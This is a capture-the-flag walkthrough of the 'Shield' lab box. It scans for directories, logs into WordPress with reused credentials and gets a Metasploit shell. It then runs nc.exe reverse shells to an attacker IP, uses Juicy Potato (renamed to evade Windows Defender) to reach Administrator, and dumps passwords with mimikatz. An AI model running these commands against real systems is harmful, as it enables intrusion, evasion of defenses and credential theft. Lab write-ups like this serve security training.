# Shield

## You know the viiiibe 

So you guessed it --> *NMAP*  
And we have the port 80/3306 and everything seems to be a Windows env with a IIS Server !
The webpage is the IIS default so nothing really interesting, let's directly deep down.

## Like looking for a needle in a HayStack

Let's use a basic dictionnary provided by [Dirb](https://github.com/v0re/dirb). Under /usr/share/wordlists/dirb, let's use common.txt  
Let's use a pretty well known tool called [Gobuster](https://github.com/OJ/gobuster)
`gobuster dir -u http://10.10.10.29/ -w /usr/share/wordlists/dirb/common.txt`  
And this command allow us to get some interesting information about the file we can found in the server !!

```bash
===============================================================
2020/09/20 11:23:42 Starting gobuster
===============================================================
/wordpress (Status: 301)
===============================================================
2020/09/20 11:23:54 Finished
===============================================================
```

Perfect let's investigate

## Let's go to WordPress  

As we excepted there is a page at *10.10.10.29/wordpress* and like every wordpress we just have to go to */wordpress/wp-login.php* to get the login page.  
And we already have the password from the **VaccineBox** so let's type in : "P@s5w0rd!" (login:admin)  
As WordPress as a lot of well known issues we're gonna use the most complete tool : **METASPLOIT** *hype increase*  
For this we will us a [Meterpreter](/article/info/Meterpreter.md) ! I will soon make a full article on this so keep an eye on it to get more informations !!  

```bash
 msf6 > use exploit/unix/webapp/wp_admin_shell_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD P@s5w0rd!
PASSWORD => P@s5w0rd!
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /wordpress
TARGETURI => /wordpress
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 10.10.10.29
RHOSTS => 10.10.10.29
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run

```

The doc of MetaSploit is really complete so just have a look for more information!!  
Now that we're in our Meterpreter let's go somewhere with RightAccess, like Uploads under wp-content of cours !!  
Now let's get a Reverse Shell that will be triggered in a Windows env!  
Let's use [nc.exe](https://github.com/int0x33/nc.exe), upload it to the upload and then trigger a listener in another shell.
And execute our nc.exe `execute -f nc.exe -a "-e cmd.exe 10.10.14.2 1234"`  
Ok now i have a cmd!!

## Exploiting the Open Window

Let's use [Juicy Potato](https://github.com/ohpe/juicy-potato) to get privileges !!
So just download the .exe on the gh and upload it too !
Let's rename to pwn.exe (Windows Defender is around !!) and then upload it too
Now that it is uploaded we want it to execute a powershell with admin rights
`START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe MY IP 1111`
Create a file with .bat extension and upload it too !
Now make a new shell listen to 1111 !!

And then from the shell who's listening at 1234 (the cmd one!)
You'll start our pwn.exe !!  
`pwn.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337`
And in the 1111 shell we've a new powershell !! Perfect !!!
Let's quickly do a `whoami` and boom Administrator  !!
Let's go to `C:\Users\Administrator\Desktop\root.txt` and the password is  `**CENSORED**`

## So much things to do, don't leave now !  

A tool called [mimikatz](https://github.com/gentilkiwi/mimikatz) (THE DEVS ARE FRENCH COCORICO MES AMIS)
That allow us to discover lots of differents things such as User, Hashes, PIN, kerberos tickets and that's cool!
From thoses tickets we can get passwords !!

Let's download the zip and upload it on the server, with our admin account start the app and launch the command `sekurlsa::logonpasswords` and boom, too much data.

But in the middle of allll this there is one bit ! really cool one !
And that's a user called "sandra" with the password "Password1234!"
